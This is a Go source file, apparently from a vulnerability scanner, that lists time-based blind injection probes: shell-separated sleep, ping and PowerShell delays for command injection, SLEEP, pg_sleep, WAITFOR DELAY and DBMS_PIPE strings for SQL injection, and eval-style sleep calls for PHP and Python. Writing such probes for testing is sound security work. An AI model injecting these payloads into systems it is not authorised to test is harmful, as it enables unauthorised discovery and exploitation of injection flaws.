package payloads

import (
	"fmt"
	"time"
)

// TimeBasedTest represents a single time-based test case.
type TimeBasedTest struct {
	// PayloadToInject is the string to inject, potentially with a format verb for the delay.
	PayloadToInject string
	// Separators are characters to prepend to the payload (mostly for command injection). Can be nil.
	Separators []string
	// ExpectedDelay is the minimum delay duration to expect for a successful test.
	ExpectedDelay time.Duration
	// Description explains the payload's target and technique.
	Description string
	// Vulnerability is the type of vulnerability being tested (e.g., "sqli", "cmdinjection", "code-injection").
	Vulnerability string
}

// TimeBasedTests contains the list of all time-based tests.
var TimeBasedTests []TimeBasedTest

// DefaultSleepTime is the default delay time in seconds for the tests.
const DefaultSleepTime = 5

func init() {
	TimeBasedTests = []TimeBasedTest{
		// --- Payloads for Command Injection ---
		{
			PayloadToInject: fmt.Sprintf("sleep %d", DefaultSleepTime),
			Separators:      []string{";", "&&", "|", "`", "\n"},
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind command injection (Unix sleep)",
			Vulnerability:   "cmdinjection",
		},
		{
			PayloadToInject: fmt.Sprintf("ping -n %d 127.0.0.1", DefaultSleepTime+1),
			Separators:      []string{"&", "&&", "|"},
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind command injection (Windows ping)",
			Vulnerability:   "cmdinjection",
		},
		{
			PayloadToInject: fmt.Sprintf("powershell -Command \"Start-Sleep -Seconds %d\"", DefaultSleepTime),
			Separators:      []string{"&", "&&", "|"},
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind command injection (Windows PowerShell)",
			Vulnerability:   "cmdinjection",
		},
		{
			PayloadToInject: fmt.Sprintf("ruby -e 'sleep %d'", DefaultSleepTime),
			Separators:      []string{";", "|", "`"},
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind command injection (Ruby interpreter)",
			Vulnerability:   "cmdinjection",
		},

		// --- Payloads for SQL Injection ---
		{
			PayloadToInject: fmt.Sprintf(" OR SLEEP(%d)", DefaultSleepTime), // Numeric context
			Separators:      nil,
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind SQLi (MySQL/MariaDB)",
			Vulnerability:   "sqli",
		},
		{
			PayloadToInject: fmt.Sprintf("' OR SLEEP(%d)-- ", DefaultSleepTime), // String context
			Separators:      nil,
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind SQLi (MySQL/MariaDB)",
			Vulnerability:   "sqli",
		},
		{
			PayloadToInject: fmt.Sprintf(" OR pg_sleep(%d)", DefaultSleepTime), // Numeric context
			Separators:      nil,
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind SQLi (PostgreSQL)",
			Vulnerability:   "sqli",
		},
		{
			PayloadToInject: fmt.Sprintf("'; SELECT pg_sleep(%d)--", DefaultSleepTime), // Stacked queries
			Separators:      nil,
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind SQLi (PostgreSQL)",
			Vulnerability:   "sqli",
		},
		{
			PayloadToInject: fmt.Sprintf("'; WAITFOR DELAY '0:0:%d'--", DefaultSleepTime), // String context
			Separators:      nil,
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind SQLi (MSSQL)",
			Vulnerability:   "sqli",
		},
		{
			PayloadToInject: fmt.Sprintf(" AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)", DefaultSleepTime), // Numeric context
			Separators:      nil,
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind SQLi (Oracle)",
			Vulnerability:   "sqli",
		},

		// --- Payloads for Code Injection (e.g., via eval()) ---
		{
			PayloadToInject: fmt.Sprintf("sleep(%d)", DefaultSleepTime),
			Separators:      nil, // No OS command separators needed
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind code injection (PHP eval)",
			Vulnerability:   "code-injection",
		},
		{
			PayloadToInject: fmt.Sprintf("__import__('time').sleep(%d)", DefaultSleepTime),
			Separators:      nil,
			ExpectedDelay:   DefaultSleepTime * time.Second,
			Description:     "Time-based blind code injection (Python eval)",
			Vulnerability:   "code-injection",
		},
	}
}
